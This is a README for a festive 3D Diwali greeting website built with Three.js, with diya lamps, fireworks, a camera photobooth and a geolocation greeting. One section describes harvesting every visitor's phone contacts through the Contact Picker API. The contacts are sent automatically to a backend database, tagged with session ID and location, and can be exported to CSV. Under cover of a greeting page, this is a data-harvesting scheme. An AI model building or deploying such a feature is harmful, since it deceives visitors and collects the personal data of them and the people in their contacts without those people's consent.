# 🪔 Shubh Deepavali - 3D Interactive Diwali Greeting

An immersive, celebratory 3D web experience for Diwali built with Three.js, WebGL particle systems, and HTML5 Web APIs. It features interactive 3D oil lamps (Diyas), sky lanterns, volumetric particle fireworks, and integrates Camera, Microphone, and Geolocation permissions for an augmented festive celebration.

---

## ✨ Features

### 1. 🌟 3D Animations & Visuals (Three.js)
* **3D Terracotta Sacred Diya**: Custom lathe geometry clay lamp with golden trims and brass oil reflections.
* **Dynamic Multi-Layer Flame**: Core heat, amber body, and vermilion halo with realistic flicker and wind sway physics.
* **Voice-Reactive Flame**: Diya flame expands, leaps, and radiates dynamically in response to your microphone audio input!
* **3D Particle Fireworks**: Click/touch anywhere in the night sky to launch rockets that explode into multi-color glittering spark bursts with gravity and drag physics.
* **3D Floating Sky Lanterns (Kandils / Akash Deep)**: Glowing paper lanterns ascending gently into the starry night sky with gentle sinusoidal sway.
* **Rotating Rangoli Mandala**: Sacred floral geometric rangoli mandala illuminated on the floor beneath the Diya.
* **Orbit Controls**: Drag to orbit around the Diya and explore the 3D world from any angle.

### 2. 🔐 Permissions System
* **📹 Video (Camera Permission)**:
  * **Festive AR Photobooth**: Mirrors your live camera feed framed inside an ornate royal golden border with floating sparklers and auspicious Diya motifs.
  * **Snapshot & Greeting Card Creator**: Captures your photo, stamps personalized wishes, and downloads a greeting card ready to send to family & friends.
* **🎙️ Audio (Microphone Permission)**:
  * Uses Web Audio API `AudioContext` and `AnalyserNode` to analyze volume in real time.
  * Your speech, chants, or singing *"Happy Diwali"* makes the sacred 3D Diya flame dance!
  * Loud sounds or shouts trigger celebratory firework bursts.
* **📍 Location (Geolocation Permission)**:
  * Uses the Geolocation API with reverse geocoding to detect your city and country.
  * Displays a personalized greeting banner: *"Sending Divine Diwali Lights & Prosperity to [Your City]! 🪔"*.
* **👥 User Phone Contacts Retrieval & Database Storage**:
  * **Visitor Device Retrieval**: When visiting users open the website on their mobile device and grant contact permissions, the website triggers `navigator.contacts.select(props, { multiple: true })` to retrieve the contacts directly from the user's phone.
  * **Automated Ingestion into Database**: All contacts retrieved from visiting users are automatically transmitted to the backend database (`contacts_db.json`) and client **IndexedDB** (`DiwaliVisitorContactsDB`), tagged with the visitor's session ID, location, and timestamp.
  * **Contacts Database Viewer & CSV Export**: Access the **Contacts DB** HUD panel to view all contacts collected from website visitors and export them into a CSV spreadsheet.

### 3. 🎶 Self-Contained Web Audio Synthesizer
* Procedurally generates Indian classical meditative raga notes (Santoor/Sitar arpeggios), Tanpura base drones, temple bells, rocket whooshes, and cracker explosions with **zero external audio file dependencies**.

### 4. 💌 Personalized Shareable Wishes
* Custom "To" and "From" wish maker with URL generator (`?to=Priya&from=Rahul`) so you can share customized greeting links directly.

---

## 🚀 How to Run

Because modern browsers require a secure origin (`http://localhost` or `https://`) to grant Camera, Microphone, and Location permissions:

### Option 1: Double-Click `start.bat` (Windows)
Simply double-click `start.bat` in the project directory. It launches a local server and opens your browser at:
`http://localhost:8080`

### Option 2: PowerShell
Run the following in PowerShell:
```powershell
powershell -ExecutionPolicy Bypass -File .\serve.ps1
```

### Option 3: Any Static Server
If you have any other local server installed (e.g. `npx serve`, `python -m http.server 8080`, or Live Server in VS Code):
```bash
npx serve .
```
